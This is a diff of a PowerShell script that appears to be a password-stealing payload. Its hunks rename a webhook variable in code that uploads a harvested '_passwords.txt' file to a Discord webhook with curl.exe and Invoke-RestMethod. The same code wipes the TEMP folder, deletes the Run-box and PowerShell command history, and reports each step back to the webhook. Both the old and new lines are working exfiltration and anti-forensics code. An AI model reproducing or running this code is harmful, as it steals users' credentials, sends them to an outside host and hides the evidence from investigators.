@@ -37,7 +37,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt"}
+if (-not ([string]::IsNullOrEmpty($hookurl))){Upload-Discord -file "$env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt"}
 
 ############################################################################################################################################################
 
@@ -68,8 +68,8 @@ rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # delete run box history
 Set-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableRegistryTools -Value 0 -ErrorAction SilentlyContinue
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; if ($?) {if (-not ([string]::IsNullOrEmpty($dc))){Invoke-RestMethod -Uri $dc -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"Success : Run history removed`"}"}}
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; if ($?) {if (-not ([string]::IsNullOrEmpty($hookurl))){Invoke-RestMethod -Uri $hookurl -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"Success : Run history removed`"}"}}
 
 
 # Delete powershell history
-Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue; if ($?) {if (-not ([string]::IsNullOrEmpty($dc))){Invoke-RestMethod -Uri $dc -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"Success : Powershell history removed`"}"}}
+Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue; if ($?) {if (-not ([string]::IsNullOrEmpty($hookurl))){Invoke-RestMethod -Uri $hookurl -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"Success : Powershell history removed`"}"}}
